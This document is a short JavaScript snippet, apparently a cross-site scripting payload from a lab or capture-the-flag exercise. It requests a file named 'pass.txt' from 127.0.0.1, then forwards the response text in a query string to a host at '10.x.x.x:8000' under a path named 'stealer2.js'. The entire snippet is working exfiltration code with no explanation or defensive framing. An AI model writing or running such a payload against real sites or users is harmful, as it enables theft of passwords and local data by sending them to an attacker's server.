var url = "http://127.0.0.1/dir/pass.txt";
var duke = "http://10.x.x.x:8000/stealer2.js";
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if (xhr.readyState == XMLHttpRequest.DONE) {
    fetch(duke + "?" + xhr.responseText);
  }
};
xhr.open('GET', url);
xhr.send(null);
